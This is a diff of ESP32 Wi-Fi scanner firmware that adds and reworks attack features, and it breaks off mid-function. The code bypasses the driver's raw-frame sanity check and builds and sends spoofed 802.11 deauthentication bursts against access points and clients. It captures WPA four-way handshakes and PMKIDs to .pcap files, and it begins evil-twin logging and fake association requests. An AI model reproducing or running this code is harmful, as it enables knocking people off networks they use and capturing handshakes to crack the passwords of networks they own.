@@ -34,17 +34,20 @@
 #ifdef ESP_PLATFORM
 #include <esp_wifi.h>
 #include <esp_timer.h>
+#include <esp_netif.h>
 #include <freertos/FreeRTOS.h>
 #include <freertos/task.h>
 #include <sys/stat.h>
+#include <sys/time.h>
+#include <time.h>
 #endif
+
+#include <stdint.h>
 
 #ifdef __cplusplus
 extern "C" {
 #endif
 
-// Override diretto nel codice sorgente attivo:
-// Forza il sanity check a restituire 0 (successo), bypassando i frame bloccati (0c0).
 int ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c) {
     return 0;
 }
@@ -63,12 +66,7 @@ constexpr auto* TAG = "WifiScanner";
 constexpr uint16_t MAX_RECORDS = 40;
 constexpr uint32_t REFRESH_MS = 1000;
 constexpr uint32_t ROW_EXPIRY_MS = 20000;
-constexpr uint32_t DATA_RATE_WINDOW_MS = 1000; // window for the per-AP data-frame rate (d/s)
 
-// The chart's x-axis runs from channel CH_AXIS_MIN to CH_AXIS_MAX across CHART_POINTS samples.
-// Channels 1..13 sit inside with a small margin for the outer bells. An AP's bell is +-2 channels
-// wide (a 20 MHz signal). A tighter range than the old -1..15 so the channel scale uses more of
-// the (wider) chart area.
 constexpr int MAX_SERIES = 8;
 constexpr int CHART_POINTS = 33;
 constexpr float BELL_HALF_WIDTH = 2.0f;
@@ -79,26 +77,15 @@ constexpr int32_t SIGNAL_RANGE_DB = 70;
 constexpr uint32_t HOP_INTERVAL_MS = 300;
 constexpr int MAX_PROBED_SSIDS = 4;
 
-/** Fraction 0..1 of the chart width where a channel's vertical line / bell peak sits. */
 inline float channelFraction(int channel) {
     return ((float)channel - CH_AXIS_MIN) / (CH_AXIS_MAX - CH_AXIS_MIN);
 }
 
-// Pure, saturated hues (each uses at most two channels). The old muted palette had a blue
-// component in every colour that was faint on the LCD but strong on the WS2812 LEDs, so "red"
-// lit up purple and "green" cyan. These render the same on screen and on the strip.
 const uint32_t SERIES_COLORS[MAX_SERIES] = {
-    0xFF0000, // red
-    0xFF7F00, // orange
-    0xFFFF00, // yellow
-    0x00FF00, // green
-    0x00FFFF, // cyan
-    0x0000FF, // blue
-    0x8000FF, // violet
-    0xFF00FF, // magenta
+    0xFF0000, 0xFF7F00, 0xFFFF00, 0x00FF00, 0x00FFFF, 0x0000FF, 0x8000FF, 0xFF00FF,
 };
 
-enum class Page { Graph, List, Detail, Clients };
+enum class Page { Graph, List, Detail, Clients, EvilTwinDetail };
 enum class RadioMode { Stopped, ActiveScan, Capture };
 
 uint64_t bssidKey(const uint8_t* bssid) {
@@ -109,7 +96,6 @@ uint64_t bssidKey(const uint8_t* bssid) {
 
 uint64_t nowMs() { return (uint64_t)lv_tick_get(); }
 
-/** One access point, merging whatever the active scan and the passive capture both know about it. */
 struct SeenAp {
     WifiApRecord record{};
     uint64_t firstSeenMs = 0;
@@ -118,57 +104,24 @@ struct SeenAp {
     int8_t rssiMax = 0;
     bool fromCapture = false;
     uint32_t packetCount = 0;
-    // Stable colour for this network, assigned once at first sight and used for both its bell on
-    // the graph and its colour bar in the list, so the two always match.
     int colorIndex = 0;
-    // Data-frame activity rate (d/s): traffic to/from this AP's clients, aggregated across all of
-    // them and counted in a rolling window - beacons alone don't reflect real usage, they fire at
-    // a fixed interval whether the network is busy or idle.
-    uint32_t dataFrameRate = 0;        // frames/sec, from the last completed window
-    uint32_t dataFrameWindowCount = 0; // frames counted in the window still open
-    uint64_t dataFrameWindowStartMs = 0;
 };
 
-/** Closes out an AP's data-rate window once it has elapsed, so a network that goes quiet drops
- * back to zero instead of keeping its last nonzero rate forever. Must be called with the AP's
- * owning ctx->mutex held. */
-void rolloverDataRate(SeenAp& ap, uint64_t now) {
-    if (ap.dataFrameWindowStartMs == 0) {
-        ap.dataFrameWindowStartMs = now;
-        return;
-    }
-    uint64_t elapsed = now - ap.dataFrameWindowStartMs;
-    if (elapsed >= DATA_RATE_WINDOW_MS) {
-        ap.dataFrameRate = (uint32_t)(ap.dataFrameWindowCount * 1000ULL / elapsed);
-        ap.dataFrameWindowCount = 0;
-        ap.dataFrameWindowStartMs = now;
-    }
-}
-
-// Handshake / PMKID capture: we buffer the raw 802.11 frames in RAM (never touch the SD from the
-// promiscuous callback) and a periodic flush writes a .pcap per network to /sdcard/handshakes.
 constexpr int HS_MAX_APS = 16;
-constexpr int HS_FRAME_MAX = 320;  // one 802.11 frame (EAPOL or beacon) we keep
+constexpr int HS_FRAME_MAX = 320;
 constexpr int HS_BEACON_MAX = 400;
 
 struct HandshakeCapture {
     char ssid[33] = {};
     uint8_t beacon[HS_BEACON_MAX] = {};
     int beaconLen = 0;
-    uint8_t eapol[4][HS_FRAME_MAX] = {}; // M1..M4, whole 802.11 frames
+    uint8_t eapol[4][HS_FRAME_MAX] = {};
     int eapolLen[4] = {0, 0, 0, 0};
-    uint8_t msgMask = 0;   // bit i set once Mi+1 is captured
+    uint8_t msgMask = 0;
     bool hasPmkid = false;
     bool saved = false;
-    // Separate from `saved`: `saved` is deliberately re-armed by every new message (so a later,
-    // more complete capture overwrites the .pcap), but the beep must fire exactly once per
-    // handshake - otherwise M3/M4 landing moments after M1+M2 each re-arm `saved` and spawn a
-    // second, overlapping eapolSoundTask that races the first for the Music service's gain/queue
-    // state, which is why it can go silent instead of beeping twice.
-    bool beepFired = false;
 };
 
-/** A device seen only through passive capture: probing for a network, or associated to one. */
 struct CapturedClient {
     uint8_t mac[6] = {};
     uint64_t firstSeenMs = 0;
@@ -177,8 +130,8 @@ struct CapturedClient {
     uint64_t associatedBssid = 0;
     std::vector<std::string> probedSsids;
     uint32_t packetCount = 0;
-    uint32_t txCount = 0; // data frames the client sent (to the AP)
-    uint32_t rxCount = 0; // data frames the client received (from the AP)
+    uint32_t txCount = 0;
+    uint32_t rxCount = 0;
 };
 
 struct Context {
@@ -187,48 +140,45 @@ struct Context {
 
     RecursiveMutex mutex;
     std::unique_ptr<Timer> timer = nullptr;
-    std::unique_ptr<Timer> ledTimer = nullptr; // fast feed for the detail VU bar
+    std::unique_ptr<Timer> ledTimer = nullptr;
     std::atomic<bool> vuFeeding{false};
     std::atomic<int> vuLevel{0};
-    std::atomic<uint32_t> vuRefreshTick{0}; // tick of the last fresh reading, for the breath swell
+    std::atomic<uint32_t> vuRefreshTick{0};
 
     Page page = Page::Graph;
     std::map<uint64_t, SeenAp> seen;
     std::map<uint64_t, CapturedClient> clients;
     std::map<uint64_t, HandshakeCapture> handshakes;
-    int handshakesSaved = 0; // .pcap files written this session
+    int handshakesSaved = 0;
     int pmkidSeen = 0;
-    int deauthBurstsSent = 0; // confirmed deauth bursts sent this session
-    // Set from the LVGL task when the confirm dialog opens, read from this app's own task when
-    // the dialog's APP_EVENT_RESULT comes back - both directions cross threads.
+    int deauthBurstsSent = 0;
+    bool evilTwinActive = false;
+    std::atomic<bool> evilTwinLogging{false};
     std::atomic<uint32_t> deauthDialogId{0};
-    std::vector<uint64_t> visible; // sorted by RSSI, rebuilt each refresh
+    std::atomic<uint32_t> clientDeauthDialogId{0};
+    std::atomic<uint32_t> pmkidDialogId{0};
+    std::atomic<uint32_t> evilTwinDialogId{0};
+    uint64_t targetClientKey = 0;
+    std::vector<uint64_t> visible;
     uint64_t selectedKey = 0;
     uint32_t detailBeaconBaseline = 0;
-    // Cached at selection time so the lock toggle still works once the AP ages out of ctx->seen
-    // (20s unheard - see ROW_EXPIRY_MS) - a live lookup there left the lock stuck forever.
     int detailChannel = 0;
-    int nextColor = 0; // running counter for assigning SeenAp::colorIndex
+    int nextColor = 0;
     RadioMode mode = RadioMode::ActiveScan;
 
-    // LED strip: the config to put back on exit/stop, and a cache of what we last pushed so we
-    // don't restart the animation every refresh.
     bool ledSaved = false;
     service::neopixel::Animation savedAnim = service::neopixel::Animation::Off;
     service::neopixel::ColorMode savedColorMode = service::neopixel::ColorMode::Static;
     uint8_t savedR = 0, savedG = 0, savedB = 0, savedBrightness = 0, savedSpeed = 0;
-    // Saved VU-meter config: the detail page borrows the meter to draw a proximity bar, so we put
-    // the user's meter settings back on exit.
     bool savedVuActive = false, savedVuDecay = false, savedVuAutoGain = false, savedVuBeatFlash = false, savedVuPeakHold = false;
     service::neopixel::VuPalette savedVuPalette = service::neopixel::VuPalette::Classic;
     service::neopixel::VuOrigin savedVuOrigin = service::neopixel::VuOrigin::BothLeft;
     uint8_t savedVuR = 0, savedVuG = 0, savedVuB = 0, savedVuBrightness = 0, savedVuSensitivity = 0;
-    int ledViewApplied = -1;   // 0 scan, 1 capture, 2 stopped, 3 detail
+    int ledViewApplied = -1;
     int ledColorApplied = -1;
 
     lv_obj_t* toolbar = nullptr;
     lv_obj_t* statusLabel = nullptr;
-
     lv_obj_t* graphPage = nullptr;
     lv_obj_t* chart = nullptr;
     lv_obj_t* labelLayer = nullptr;
@@ -236,26 +186,36 @@ struct Context {
     lv_obj_t* scanButton = nullptr;
     lv_obj_t* captureButton = nullptr;
     lv_obj_t* stopButton = nullptr;
-
     lv_obj_t* listPage = nullptr;
     lv_obj_t* list = nullptr;
     std::map<uint64_t, lv_obj_t*> rows;
-
     lv_obj_t* detailPage = nullptr;
     lv_obj_t* detailScroll = nullptr;
-    lv_obj_t* detailInfo = nullptr;
     lv_obj_t* detailClientsButton = nullptr;
     lv_obj_t* detailLockButton = nullptr;
     lv_obj_t* detailDeauthButton = nullptr;
-    lv_obj_t* detailHsSummary = nullptr; // compact "HS: x/4  PMKID: si/no" right under Deauth
+    lv_obj_t* detailPmkidButton = nullptr;
+    lv_obj_t* detailEvilTwinButton = nullptr;
+    lv_obj_t* detailEvilTwinDetailsButton = nullptr;
+    lv_obj_t* detailHsSummary = nullptr;
+    lv_obj_t* detailSsidLabel = nullptr;
+    lv_obj_t* detailMacLabel = nullptr;
+    lv_obj_t* detailSecLabel = nullptr;
+    lv_obj_t* detailChanLabel = nullptr;
+    lv_obj_t* detailPowerLabel = nullptr;
+    lv_obj_t* detailPhyLabel = nullptr;
+    lv_obj_t* detailTimeLabel = nullptr;
+    lv_obj_t* detailDeauthLabel = nullptr;
     lv_obj_t* connectButton = nullptr;
-
     lv_obj_t* clientsPage = nullptr;
     lv_obj_t* clientsList = nullptr;
     std::map<uint64_t, lv_obj_t*> clientRows;
-};
 
-// ---- Capture engine (ESP32 only - passive sniffing needs direct esp_wifi access) ----
+    lv_obj_t* etDetailPage = nullptr;
+    lv_obj_t* etStatusLabel = nullptr;
+    lv_obj_t* etClientsList = nullptr;
+    lv_obj_t* etLogToggleButton = nullptr;
+};
 
 #ifdef ESP_PLATFORM
 
@@ -263,12 +223,10 @@ std::atomic<Context*> g_captureCtx{nullptr};
 std::atomic<bool> g_captureRunning{false};
 std::atomic<bool> g_captureStopped{true};
 std::atomic<int> g_hopChannel{1};
-// 0 = hop normally; 1..13 = park on that channel (targeted capture, so a handshake on that
-// AP isn't missed while the radio is off visiting other channels).
 std::atomic<int> g_lockChannel{0};
 
-/** Pulls the SSID (tag 0) and a WPA/WPA2/OPEN/WEP guess out of a beacon/probe-response's IEs.
- * No AKM parsing, so WPA3/SAE reads as WPA2 here - good enough to color the list, not a survey tool. */
+std::string macToString(const uint8_t* mac);
+
 void parseBeaconIes(const uint8_t* ies, int iesLen, uint16_t capability,
     std::string& ssidOut, bool& ssidSeen, WifiAuthenticationType& authOut) {
     bool privacy = (capability & 0x0010) != 0;
@@ -298,7 +256,6 @@ void parseBeaconIes(const uint8_t* ies, int iesLen, uint16_t capability,
     else authOut = WIFI_AUTHENTICATION_TYPE_WEP;
 }
 
-/** @return the SSID carried in a probe request's IEs, or empty if none/broadcast. */
 std::string parseProbeRequestSsid(const uint8_t* ies, int iesLen) {
     int i = 0;
     while (i + 2 <= iesLen) {
@@ -311,6 +268,40 @@ std::string parseProbeRequestSsid(const uint8_t* ies, int iesLen) {
         i += 2 + len;
     }
     return {};
+}
+
+void sanitizeAscii(char* str) {
+    if (!str) return;
+    char* r = str;
+    char* w = str;
+    while (*r) {
+        unsigned char c = (unsigned char)*r;
+        if (c == 0xC3 && *(r + 1)) {
+            unsigned char c2 = (unsigned char)*(r + 1);
+            if (c2 >= 0x80 && c2 <= 0x85) *w++ = 'A';
+            else if (c2 >= 0xA0 && c2 <= 0xA5) *w++ = 'a';
+            else if (c2 >= 0x88 && c2 <= 0x8B) *w++ = 'E';
+            else if (c2 >= 0xA8 && c2 <= 0xAB) *w++ = 'e';
+            else if (c2 >= 0x8C && c2 <= 0x8F) *w++ = 'I';
+            else if (c2 >= 0xAC && c2 <= 0xAF) *w++ = 'i';
+            else if (c2 >= 0x92 && c2 <= 0x96) *w++ = 'O';
+            else if (c2 >= 0xB2 && c2 <= 0xB6) *w++ = 'o';
+            else if (c2 >= 0x99 && c2 <= 0x9C) *w++ = 'U';
+            else if (c2 >= 0xB9 && c2 <= 0xBC) *w++ = 'u';
+            else if (c2 == 0x87) *w++ = 'C';
+            else if (c2 == 0xA7) *w++ = 'c';
+            else if (c2 == 0x91) *w++ = 'N';
+            else if (c2 == 0xB1) *w++ = 'n';
+            else *w++ = '?';
+            r += 2;
+        } else if (c > 127) {
+            *w++ = '?';
+            r++;
+        } else {
+            *w++ = *r++;
+        }
+    }
+    *w = '\0';
 }
 
 void upsertApFromCapture(Context* ctx, const uint8_t* bssid, const std::string& ssid, bool ssidSeen,
@@ -326,6 +317,7 @@ void upsertApFromCapture(Context* ctx, const uint8_t* bssid, const std::string& 
             size_t len = std::min<size_t>(ssid.size(), sizeof(ap.record.ssid) - 1);
             memcpy(ap.record.ssid, ssid.data(), len);
             ap.record.ssid[len] = '\0';
+            sanitizeAscii(ap.record.ssid);
         }
         ap.record.channel = channel;
         ap.record.rssi = rssi;
@@ -344,6 +336,7 @@ void upsertApFromCapture(Context* ctx, const uint8_t* bssid, const std::string& 
             size_t len = std::min<size_t>(ssid.size(), sizeof(ap.record.ssid) - 1);
             memcpy(ap.record.ssid, ssid.data(), len);
             ap.record.ssid[len] = '\0';
+            sanitizeAscii(ap.record.ssid);
         }
         ap.record.channel = channel;
         ap.record.rssi = rssi;
@@ -390,19 +383,9 @@ void upsertClientAssociation(Context* ctx, const uint8_t* mac, const uint8_t* bs
     client.associatedBssid = bssidKey(bssid);
     client.packetCount++;
     if (clientSent) client.txCount++; else client.rxCount++;
-
-    // Aggregate this frame onto the AP's own data-rate window (same traffic, counted per network
-    // instead of per client).
-    auto apIt = ctx->seen.find(bssidKey(bssid));
-    if (apIt != ctx->seen.end()) {
-        rolloverDataRate(apIt->second, now);
-        apIt->second.dataFrameWindowCount++;
-    }
     ctx->mutex.unlock();
 }
 
-/** Stores a raw beacon for an AP we're already collecting a handshake for (gives the .pcap its
- * SSID). Only kept for tracked BSSIDs, to bound RAM. */
 void storeBeaconForHandshake(Context* ctx, const uint8_t* bssid, const uint8_t* frame, int len, const std::string& ssid) {
     if (!ctx->mutex.lock(0)) return;
     auto it = ctx->handshakes.find(bssidKey(bssid));
@@ -419,27 +402,25 @@ void storeBeaconForHandshake(Context* ctx, const uint8_t* bssid, const uint8_t* 
     ctx->mutex.unlock();
 }
 
-/** Detects an EAPOL-Key frame (the WPA 4-way handshake) and buffers the whole 802.11 frame in the
- * right message slot (M1..M4) for its AP. Also flags a PMKID when the AP exposes one in M1. */
 void handleEapol(Context* ctx, const uint8_t* payload, int len, uint8_t subtype, const uint8_t* addr1, const uint8_t* addr2) {
     int hdr = 24;
-    if (subtype & 0x08) hdr += 2; // QoS data carries a 2-byte QoS control field
+    if (subtype & 0x08) hdr += 2;
     if (len < hdr + 8 + 7) return;
     const uint8_t* llc = payload + hdr;
-    if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03)) return; // not LLC/SNAP
-    if (((llc[6] << 8) | llc[7]) != 0x888E) return;                    // not EAPOL
+    if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03)) return;
+    if (((llc[6] << 8) | llc[7]) != 0x888E) return;
     const uint8_t* eapol = llc + 8;
     int eapolLen = len - hdr - 8;
-    if (eapolLen < 7 || eapol[1] != 0x03) return;                      // EAPOL-Key only
+    if (eapolLen < 7 || eapol[1] != 0x03) return;
     uint16_t keyInfo = (eapol[5] << 8) | eapol[6];
     bool mic = keyInfo & 0x0100, ack = keyInfo & 0x0080, install = keyInfo & 0x0040, secure = keyInfo & 0x0200;
     int slot;
-    if (ack && !mic) slot = 0;                  // M1 (AP -> STA)
-    else if (mic && !ack && !secure) slot = 1;  // M2 (STA -> AP)
-    else if (ack && mic && install) slot = 2;   // M3 (AP -> STA)
-    else if (mic && !ack && secure) slot = 3;   // M4 (STA -> AP)
+    if (ack && !mic) slot = 0;
+    else if (mic && !ack && !secure) slot = 1;
+    else if (ack && mic && install) slot = 2;
+    else if (mic && !ack && secure) slot = 3;
     else return;
-    const uint8_t* bssid = (slot == 0 || slot == 2) ? addr2 : addr1;   // the AP side
+    const uint8_t* bssid = (slot == 0 || slot == 2) ? addr2 : addr1;
 
     bool pmkid = false;
     if (slot == 0) {
@@ -447,13 +428,6 @@ void handleEapol(Context* ctx, const uint8_t* payload, int len, uint8_t subtype,
             if (eapol[i] == 0xDD && eapol[i + 2] == 0x00 && eapol[i + 3] == 0x0F &&
                 eapol[i + 4] == 0xAC && eapol[i + 5] == 0x04) { pmkid = true; break; }
         }
-        // Diagnostic: tells apart "M1 never captured" (so this scan never even ran) from "M1
-        // captured but this AP just doesn't send a PMKID KDE" (which is a legitimate, common
-        // case - PMKID in M1 is optional and vendor-dependent, not every router sends one).
-        // LOG_W, not LOG_I: on this build Info-level lines never reach the serial log (confirmed
-        // empirically - even the pre-existing deauth LOG_I never showed), only Warning does.
-        LOG_W(TAG, "handshake: M1 for AP %02x:%02x:%02x:%02x:%02x:%02x, pmkid=%s",
-            bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], pmkid ? "yes" : "no");
     }
 
     if (!ctx->mutex.lock(0)) return;
@@ -473,17 +447,14 @@ void handleEapol(Context* ctx, const uint8_t* payload, int len, uint8_t subtype,
         memcpy(hc.eapol[slot], payload, n);
         hc.eapolLen[slot] = n;
         hc.msgMask |= (uint8_t)(1 << slot);
-        hc.saved = false; // a new message arrived - allow a re-save with more of the handshake
-        // Diagnostic: shows the real capture order (M1 is the one most likely lost to the
-        // channel-hop race, since it fires within ms of association - well under one hop dwell).
-        // LOG_W, not LOG_I: see the note on the M1/PMKID log above - Info never reaches the log.
-        LOG_W(TAG, "handshake: M%d captured, mask now 0x%02x", slot + 1, hc.msgMask);
+        hc.saved = false;
     }
     if (pmkid && !hc.hasPmkid) { hc.hasPmkid = true; ctx->pmkidSeen++; }
     ctx->mutex.unlock();
 }
 
-/** Runs on the ESP-IDF WiFi task context (guaranteed by esp_wifi_set_promiscuous_rx_cb). */
+void logEvilTwinPacket(const uint8_t* payload, int len);
+
 void onPromiscuousPacket(void* buf, wifi_promiscuous_pkt_type_t type) {
     if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
     Context* ctx = g_captureCtx.load();
@@ -491,8 +462,13 @@ void onPromiscuousPacket(void* buf, wifi_promiscuous_pkt_type_t type) {
 
     auto* pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
     const uint8_t* payload = pkt->payload;
-    int len = pkt->rx_ctrl.sig_len;
-    if (len < 24) return;
+    int rawLen = pkt->rx_ctrl.sig_len;
+    if (rawLen < 28) return;
+    int len = rawLen - 4;
+
+    if (ctx->evilTwinLogging.load()) {
+        logEvilTwinPacket(payload, len);
+    }
 
     uint16_t fc = payload[0] | (payload[1] << 8);
     uint8_t frameType = (fc >> 2) & 0x3;
@@ -505,8 +481,8 @@ void onPromiscuousPacket(void* buf, wifi_promiscuous_pkt_type_t type) {
     int8_t rssi = pkt->rx_ctrl.rssi;
     int channel = pkt->rx_ctrl.channel;
 
-    if (frameType == 0) { // management
-        if ((frameSubtype == 8 || frameSubtype == 5) && len >= 24 + 12) { // beacon / probe response
+    if (frameType == 0) {
+        if ((frameSubtype == 8 || frameSubtype == 5) && len >= 24 + 12) {
             uint16_t capability = payload[24 + 10] | (payload[24 + 11] << 8);
             std::string ssid;
             bool ssidSeen = false;
@@ -514,25 +490,20 @@ void onPromiscuousPacket(void* buf, wifi_promiscuous_pkt_type_t type) {
             parseBeaconIes(payload + 24 + 12, len - 24 - 12, capability, ssid, ssidSeen, auth);
             upsertApFromCapture(ctx, addr3, ssid, ssidSeen, channel, rssi, auth);
             storeBeaconForHandshake(ctx, addr3, payload, len, ssid);
-        } else if (frameSubtype == 4) { // probe request
+        } else if (frameSubtype == 4) {
             std::string ssid = parseProbeRequestSsid(payload + 24, len - 24);
             upsertClientProbe(ctx, addr2, ssid, rssi);
         }
-    } else if (frameType == 2) { // data
+    } else if (frameType == 2) {
         if (toDs && !fromDs) {
-            // client -> AP: the client is the sender (addr2), AP is addr1
             upsertClientAssociation(ctx, addr2, addr1, rssi, true);
         } else if (!toDs && fromDs) {
-            // AP -> client: the client is the receiver (addr1), AP is addr2
             upsertClientAssociation(ctx, addr1, addr2, rssi, false);
         }
-        handleEapol(ctx, payload, len, frameSubtype, addr1, addr2); // 4-way handshake / PMKID
+        handleEapol(ctx, payload, len, frameSubtype, addr1, addr2);
     }
 }
 
-// Kismet-style hop order: spread (consecutive hops land far apart in the band, not 1,2,3...) and
-// weighted so the three non-overlapping channels 1/6/11 - where most APs live - are visited twice
-// per cycle. This catches more without needing a faster (flickerier) hop than ~300 ms/channel.
 constexpr int HOP_SEQUENCE[] = {1, 6, 11, 3, 8, 13, 2, 7, 1, 6, 11, 4, 9, 5, 10, 12};
 constexpr int HOP_SEQUENCE_LEN = sizeof(HOP_SEQUENCE) / sizeof(HOP_SEQUENCE[0]);
 
@@ -548,7 +519,7 @@ int32_t hopTask(void* /*arg*/) {
         int lock = g_lockChannel.load();
         int channel;
         if (lock >= 1 && lock <= 13) {
-            channel = lock; // parked: stay put so M1..M4 of the handshake all land on us
+            channel = lock;
         } else {
             channel = HOP_SEQUENCE[i];
             i = (i + 1) % HOP_SEQUENCE_LEN;
@@ -569,8 +540,6 @@ void startCapture(Context* ctx) {
     if (g_captureRunning.load()) return;
     g_captureCtx.store(ctx);
     g_captureStopped.store(false);
-    // 0 is not a valid Wi-Fi channel - keeps sendDeauthBurstOnChannel()'s wait from matching a
-    // stale value left over from a previous capture before hopTask has set a real one.
     g_hopChannel.store(0);
     g_captureRunning.store(true);
     xTaskCreatePinnedToCore(
@@ -580,7 +549,7 @@ void startCapture(Context* ctx) {
 
 void stopCapture(Context* ctx) {
     if (!g_captureRunning.load()) return;
-    g_lockChannel.store(0); // next capture starts hopping again, not parked
+    g_lockChannel.store(0);
     g_captureRunning.store(false);
     for (int i = 0; i < 100 && !g_captureStopped.load(); i++) {
         vTaskDelay(pdMS_TO_TICKS(20));
@@ -593,109 +562,310 @@ bool isCaptureSupported() { return true; }
 
 void setCaptureLockChannel(int ch) { g_lockChannel.store(ch); }
 int getCaptureLockChannel() { return g_lockChannel.load(); }
-// The channel the radio is actually sitting on right now - hopTask only re-reads the lock once
-// per HOP_INTERVAL_MS, so right after setCaptureLockChannel() this can still briefly be the old
-// (wrong) channel. Anything that transmits immediately (deauth) must wait for this to catch up.
 int getCurrentRadioChannel() { return g_hopChannel.load(); }
 
-// ---- Deauth (attack #2) ----
-
 constexpr uint8_t BROADCAST_MAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-constexpr int DEAUTH_BURST_COUNT = 12;
-constexpr int DEAUTH_FRAME_GAP_MS = 25;
-constexpr int DEAUTH_BLOCK_COUNT = 6;    // repeat the whole burst this many times, back to back
-constexpr int DEAUTH_BLOCK_GAP_MS = 200; // pause between blocks, so each one is a distinct burst
+constexpr int DEAUTH_BURST_SETS = 6;
+constexpr int DEAUTH_FRAMES_PER_SET = 6;
+constexpr int DEAUTH_FRAME_GAP_MS = 50;
+constexpr int DEAUTH_SET_GAP_MS = 200;
 
-/** Builds and sends one 802.11 deauthentication frame: addr1 = destination, addr2 = source
- * (the spoofed sender), addr3 = BSSID. Reason 7 ("class 3 frame from a non-associated
- * station") is what aireplay-ng uses. en_sys_seq=true lets the radio fill the sequence
- * number, so the seq-ctl field here is left at 0. */
+constexpr int ASSOC_BURST_SETS = 6;
+constexpr int ASSOC_FRAMES_PER_SET = 6;
+constexpr int ASSOC_FRAME_GAP_MS = 50;
+constexpr int ASSOC_SET_GAP_MS = 200;
+
+std::string macToString(const uint8_t* mac) {
+    char text[18];
+    snprintf(text, sizeof(text), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+    return text;
+}
+
 void sendDeauthFrame(const uint8_t* addr1, const uint8_t* addr2, const uint8_t* bssid) {
     uint8_t frame[26] = {
-        0xC0, 0x00,  // Frame Control: management, subtype 12 (deauthentication)
-        0x00, 0x00,  // Duration
-        0, 0, 0, 0, 0, 0,  // addr1
-        0, 0, 0, 0, 0, 0,  // addr2
-        0, 0, 0, 0, 0, 0,  // addr3 (BSSID)
-        0x00, 0x00,  // Seq-ctl
-        0x07, 0x00,  // Reason code 7
+        0xC0, 0x00,
+        0x00, 0x00,
+        0, 0, 0, 0, 0, 0,
+        0, 0, 0, 0, 0, 0,
+        0, 0, 0, 0, 0, 0,
+        0x00, 0x00,
+        0x07, 0x00,
     };
     memcpy(frame + 4, addr1, 6);
     memcpy(frame + 10, addr2, 6);
     memcpy(frame + 16, bssid, 6);
-    // Nothing downstream ever looked at this - a driver-level failure (e.g. not yet past
-    // esp_wifi_start(), or a scan in progress) was silently swallowed, so there was no way to
-    // tell "frames go out but the client ignores them" apart from "frames never go out at all".
     esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), true);
     if (err != ESP_OK) {
         LOG_W(TAG, "deauth: esp_wifi_80211_tx failed: %s", esp_err_to_name(err));
     }
 }
 
-/** DEAUTH_BLOCK_COUNT bounded bursts for one AP, back to back - not a continuous flood. Forces
- * one reconnect (useful to catch a fresh handshake), it does not keep clients off the network;
- * repeating the burst in blocks only raises the odds one of them lands in the client's receive
- * window, same reasoning aireplay-ng's own --deauth count applies. Broadcasts to every client
- * when @a client is null; otherwise also spoofs the reverse (client -> AP) direction, since a
- * real client ignores a deauth that isn't addressed to it. */
-void sendDeauthBurst(const uint8_t* bssid, const uint8_t* client) {
-    const uint8_t* target = (client != nullptr) ? client : BROADCAST_MAC;
-    for (int block = 0; block < DEAUTH_BLOCK_COUNT; block++) {
-        // LOG_W, not LOG_I: Info-level lines never reach the serial log on this build (confirmed
-        // empirically), only Warning and above do.
-        LOG_W(TAG, "deauth: block %d/%d, %d frames to %02x:%02x:%02x:%02x:%02x:%02x for AP %02x:%02x:%02x:%02x:%02x:%02x",
-            block + 1, DEAUTH_BLOCK_COUNT, DEAUTH_BURST_COUNT,
-            target[0], target[1], target[2], target[3], target[4], target[5],
-            bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
-        for (int i = 0; i < DEAUTH_BURST_COUNT; i++) {
-            sendDeauthFrame(target, bssid, bssid);
-            if (client != nullptr) {
-                sendDeauthFrame(bssid, client, bssid);
+struct DeauthTaskParams {
+    uint8_t bssid[6];
+    uint8_t client[6];
+    bool hasClient;
+    int channel;
+};
+
+void deauthBurstTask(void* arg) {
+    auto* params = static_cast<DeauthTaskParams*>(arg);
+    
+    int i = 0;
+    for (; i < 40 && getCurrentRadioChannel() != params->channel; i++) {
+        vTaskDelay(pdMS_TO_TICKS(10));
+    }
+
+    const uint8_t* target = params->hasClient ? params->client : BROADCAST_MAC;
+    std::string bssidStr = macToString(params->bssid);
+    std::string targetStr = macToString(target);
+
+    for (int set = 0; set < DEAUTH_BURST_SETS; set++) {
+        LOG_I(TAG, "deauth: burst %d/%d ch%d | BSSID: %s -> Target: %s", 
+            set + 1, DEAUTH_BURST_SETS, params->channel, bssidStr.c_str(), targetStr.c_str());
+        for (int f = 0; f < DEAUTH_FRAMES_PER_SET; f++) {
+            sendDeauthFrame(target, params->bssid, params->bssid);
+            if (params->hasClient) {
+                sendDeauthFrame(params->bssid, params->client, params->bssid);
             }
             vTaskDelay(pdMS_TO_TICKS(DEAUTH_FRAME_GAP_MS));
         }
-        if (block + 1 < DEAUTH_BLOCK_COUNT) {
-            vTaskDelay(pdMS_TO_TICKS(DEAUTH_BLOCK_GAP_MS));
+        if (set < DEAUTH_BURST_SETS - 1) {
+            vTaskDelay(pdMS_TO_TICKS(DEAUTH_SET_GAP_MS));
         }
     }
+
+    delete params;
+    vTaskDelete(nullptr);
 }
 
-/** setCaptureLockChannel() only posts the request - hopTask re-reads it once per
- * HOP_INTERVAL_MS, so right after locking the radio can still briefly be sitting on the
- * previous (wrong) channel. The whole burst (a couple hundred ms) is short enough to otherwise
- * race past that window and go out on the wrong channel entirely, which is exactly what makes
- * it silently do nothing. Wait for the radio to actually get there first (bounded, so a lock
- * that somehow never lands - e.g. hopTask not running - can't hang this forever). */
-void sendDeauthBurstOnChannel(const uint8_t* bssid, int channel) {
+void sendDeauthBurstOnChannel(const uint8_t* bssid, int channel, const uint8_t* client = nullptr) {
+    auto* params = new DeauthTaskParams{};
+    memcpy(params->bssid, bssid, 6);
+    if (client != nullptr) {
+        memcpy(params->client, client, 6);
+        params->hasClient = true;
+    } else {
+        params->hasClient = false;
+    }
+    params->channel = channel;
+
+    xTaskCreatePinnedToCore(deauthBurstTask, "wifi_deauth", 3072, params, tskIDLE_PRIORITY + 1, nullptr, WIFI_TASK_CORE_ID);
+}
+
+void sendAssociationRequest(const uint8_t* bssid, const char* ssid, const uint8_t* fakeClient) {
+    int ssidLen = ssid ? strlen(ssid) : 0;
+    if (ssidLen > 32) ssidLen = 32;
+
